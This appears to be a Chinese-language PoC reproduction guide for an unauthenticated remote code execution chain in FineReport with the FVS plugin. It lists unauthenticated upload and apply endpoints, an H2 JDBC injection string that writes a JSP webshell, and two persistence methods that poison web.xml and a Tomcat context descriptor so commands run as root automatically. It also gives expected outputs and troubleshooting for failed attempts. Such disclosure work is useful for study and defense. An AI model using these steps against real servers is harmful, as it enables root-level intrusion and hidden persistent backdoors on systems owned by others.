# 复现指南（附三份 pcap 流量样本）

> 配套：`poc-h2.py`、`poc-attach.py`、`pcaps/`。
> 前置：装有 FVS 插件的 FineReport < 11.5.16（实验基线 11.5.15 + 插件 4.13.0，官方镜像，Tomcat 9.0.118）；
> 攻击机只需 Python3。
> 下文路径按官方镜像布局；其它部署用 `--write-dir`（方法一）和 `--tomcat-home`（方法二）调整。

---

## 一、准备环境（有现成靶标可跳过）

以实验容器为例（重制 = 三步，随时恢复出厂）：

```bash
# 1. 删旧容器(所有植入物随之消失)
docker rm -f fr-engine
# 2. 原镜像重建(FVS 插件镜像自带, 不需要装)
docker run -d --name fr-engine -p 18081:8080 \
  -e "JAVA_OPTS=-server -Xmx1536M -Djava.awt.headless=true" \
  <你的 FR 11.5.x 镜像>
# 3. 等 FR 起来(约 60-80 秒)
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:18081/webroot/decision/login
# 200 = 就绪
```

**应用怎么部署会影响方法三是否全自动。** 官方镜像把 `/webroot` 直接写在 `server.xml` 里（`appBase="none"`），
这个应用不受 Tomcat 的部署管理；放在 `webapps/` 下由 Tomcat 自动部署的普通部署则受管理。区别见方法三。

## 二、方法一：H2 交互模式（约 10 秒）

```bash
python3 poc-h2.py -t http://<靶标>:18081
```

期望输出（`uid=` 是目标应用进程身份）：

```
[1] upload  -> 200  id=<uuid>
[2] apply   -> 200  {"applySuccess":true,...}
[3] trigger -> 200  waitFor=0          ← JSP 已被 Tomcat 编译执行
[4] readback-> 200
----------------------------------------------
PWN-FVS-UNAUTH-RCE
uid=0(root) ...
----------------------------------------------
```

想反复执行不同命令：`-c "任意命令"`（输出自动落到 webroot 再取回打印）；想换载荷形态：`--shape stealth`。

**pcap 导览**（`pcaps/h2-route.pcap`，Wireshark 打开，过滤 `http`）——整条链就 4 个请求：

| 序 | 请求 | 作用 |
|---|---|---|
| 1 | `POST /webroot/decision/view/duchamp/reuse/item?tplPath=reportlets&...props=...` | 未授权上传复用包；props.name 里是 H2 注入串（`x;INIT=CALL FILE_WRITE(...)--`） |
| 2 | `POST /webroot/decision/view/duchamp/reuse/apply/v2/tpl?...` | 未授权 apply → 数据连接打开注入的 jdbc:h2 URL → FILE_WRITE 落 JSP |
| 3 | `GET /pwn_fvs.jsp?c=<命令>` | 触发：Jasper 编译执行 JSP，命令输出重定向进 txt |
| 4 | `GET /webroot/pwn_poc_readback.txt` | 回读命令输出 |

服务器落盘物：`ROOT/pwn_fvs.jsp`（96B）+ `webroot/pwn_poc_readback.txt`（回显）。

## 三、方法二：H2 植入模式（全自动，约 45 秒）

```bash
python3 poc-h2.py -t http://<靶标>:18081 --implant            # 默认命令: id/hostname/date
python3 poc-h2.py -t http://<靶标>:18081 --implant -c "id"    # 自定义命令(写入时固化)
```

期望输出：

```
[1] web.xml(投毒)   -> 200/200
[2] x.env(jspInit)  -> 200/200
[3] 容器描述符      -> 200/200   (/usr/local/tomcat/conf/Catalina/localhost/z.xml)
[4] 等待 autoDeploy 自动部署并执行(最长 200s, 实测 10~60s)...
    命令已自动执行(零重启, 零触发请求):
----------------------------------------------
PWN-H2-IMPLANT
uid=0(root) gid=0(root) groups=0(root)
<容器hostname>
----------------------------------------------
```

三枪各做什么：

| 枪 | 写入的文件 | 内容 |
|---|---|---|
| 1 | `webroot/WEB-INF/web.xml` | 投毒的部署描述符：`<jsp-file>` 指向 `/WEB-INF/x.env` + `<load-on-startup>` |
| 2 | `webroot/WEB-INF/x.env` | `jspInit()` 声明块，命令固化在里面 |
| 3 | `conf/Catalina/localhost/z.xml` | Tomcat 上下文描述符：`<Context docBase="…/webapps/webroot" />` |

第三枪落盘后，Tomcat 的 `autoDeploy`（出厂默认开启）在数秒内自动部署新上下文，部署时读入毒
`web.xml`、编译 `x.env` 并执行 `jspInit()`。不需要重启，也不需要任何触发请求。

纯净出厂容器上的实测时间线（`RestartCount=0`）：

| 时间 | 事件 |
|---|---|
| 14:27:17–18 | 三枪写入 |
| 14:27:21 | Tomcat 日志：`HostConfig.deployDescriptor 正在部署部署描述符[…/z.xml]` |
| 14:28:03 | `部署描述符[…/z.xml]的部署已在[42,562]ms内完成`；同一秒输出文件落地，`uid=0(root)` |

**pcap 导览**（`pcaps/h2-implant-auto.pcap`）：

| 序 | 请求 | 说明 |
|---|---|---|
| 1–6 | 3× `POST .../reuse/item` + 3× `POST .../apply/v2/tpl` | 三枪，每枪一组上传 + apply |
| — | 9× `GET /webroot/implant_readback.txt` | PoC 每 6 秒轮询回读文件：前 8 次 404（还在部署），最后一次 200 带 `uid=0` |

除这 6 个 POST 和轮询 GET 之外没有别的请求。服务器侧对应的 Tomcat 日志是中文的，检索时用
`HostConfig.deployDescriptor` 或"部署描述符"，不要用英文 `Deploying`。

## 四、方法三：附件层（应用由 Tomcat 管理时全自动，约 50 秒）

```bash
python3 poc-attach.py -t http://<靶标>:18081            # 默认命令: id/hostname/date
python3 poc-attach.py -t http://<靶标>:18081 -c "id"    # 自定义命令(写入时固化)
```

期望输出：

```
[1] upload  -> 200  id=<uuid>
[2] apply   -> 200  {"applySuccess":true,...}
    （WEB-INF/web.xml + WEB-INF/x.env 已落盘, 命令已固化进 jspInit）
[3] 等待 Tomcat 自动重载并执行(最长 180s, 每 6s 探测回读文件)...
    命令已执行（无需任何触发请求）:
----------------------------------------------
PWN-ATTACH-LAYER-RCE
uid=0(root) gid=0(root) groups=0(root)
<容器hostname>
----------------------------------------------
```

它只写两个文件：毒 `WEB-INF/web.xml`（`<jsp-file>` 指向 `/WEB-INF/x.env` + `<load-on-startup>`）和
`WEB-INF/x.env`（`jspInit()`，命令固化）。然后靠 Tomcat 的一条规则：**由它自己管理的应用，`WEB-INF/web.xml`
一变就自动重载**。实测时间线（`RestartCount=0`，无触发请求）：

| 时间 | 事件 |
|---|---|
| 15:45:29 | 上传 + apply，两个文件落盘 |
| 15:45:34 | Tomcat 日志：`StandardContext.reload 已开始重新加载名为[/z]的上下文`（5 秒后） |
| 15:46:17 | `已完成重新加载`；同一秒输出文件落地，`uid=0(root)` |

**什么时候不算全自动**：官方镜像把 `/webroot` 直接写死在 `server.xml` 里且 `appBase="none"`，这个应用不受
Tomcat 的部署管理，改它的 `web.xml` 不会触发重载（开 `reloadable` 也不会——它只监听 classes 和 lib，都实测过）。
在这种部署上本方法只完成植入，要等重启/重部署。解决办法是先跑一次方法二：它写的上下文描述符会让应用转为
Tomcat 管理，之后本方法就是全自动的。上面那张时间线就是在出厂镜像上先放了一个描述符之后测的（实验时用靶场侧
命令放的，等价于方法二的第三枪）。

**pcap 导览**（`pcaps/attach-route.pcap`）：

| 序 | 请求 | 说明 |
|---|---|---|
| 1 | `POST .../reuse/item?...` | 未授权上传（附件清单版包） |
| 2 | `POST .../apply/v2/tpl?...` | 未授权 apply → 附件层写 `WEB-INF/web.xml` + `WEB-INF/x.env` |
| — | 9× `GET /webroot/attach_poc_readback.txt` | PoC 每 6 秒轮询：重载完成前 404，最后一次 200 带 `uid=0` |

只有 1 个上传、1 个 apply，其余都是轮询读结果，没有任何触发请求。服务器侧日志搜 `StandardContext.reload`。

## 五、自己抓 pcap

```bash
# 靶标机上(localhost 场景; tcpdump 需 root)。-U 逐包落盘, 否则收尾时缓冲区里的最后几包会丢
sudo tcpdump -i lo -U -s 0 -w /tmp/mine.pcap tcp port 18081 &
# ...跑上面的 PoC...
sleep 3
sudo pkill -x tcpdump
# 远程靶标则抓对应网卡: -i eth0 host <靶标IP>
```

## 六、常见坑

| 现象 | 原因/处理 |
|---|---|
| 上传 404 | 路由打错或目标没装 FVS 插件（无 `/view/duchamp/*`） |
| 上传 200 但没有 `id`，响应里是 `errorCode` | `props.name` 被拒（如含 `WEB-INF/lib` 路径会报 `Special char prohibit`）；或容器刚重启、插件还没就绪，等登录页 200 后再打 |
| apply 后 webroot 的 JSP 消失变 `.blocked` | security.enhance 插件的 JSP-Monitor——所以交互模式写 ROOT、植入模式写 WEB-INF |
| `--implant` 写完描述符却超时 | 确认 `--tomcat-home` 指向目标 Tomcat 根目录、其 `autoDeploy` 未被关闭；否则命令会在下次重启/重部署时执行 |
| `poc-attach.py` 植入后超时 | 该应用不受 Tomcat 部署管理（如官方镜像的 `/webroot` 写死在 `server.xml`）。先跑方法二让它转为 Tomcat 管理，或等重启/重部署 |
| 在日志里找不到重载记录 | 该镜像的 Tomcat 日志是中文的：找 `StandardContext.reload` / `HostConfig.deployDescriptor`，或"重新加载"/"部署描述符" |
| `tcpdump` 抓不到 | 非 root；流量不走 lo（远程靶标抓 eth0）；没加 `-U` 导致末尾丢包 |
| 想清场还原 | 删 `WEB-INF/web.xml`、`WEB-INF/x.env`、`conf/Catalina/localhost/z.xml`、`ROOT/*.jsp`、`webroot/*.txt`；或直接重建容器 |

## 七、文件指纹（sha256）

```
516d6e8a524594def971f1dbe245be9f68299c6ee67b1afe9dd4ef99b1e1e718  pcaps/h2-route.pcap
3997102ea5620ba49e679fb075650701b3be854eae627f651ee92eacbbbf081c  pcaps/h2-implant-auto.pcap
5ce8d9305d495c94f2bebf7b8be7a218543d227f0a281a172e781eec2fc7e0dd  pcaps/attach-route.pcap
```
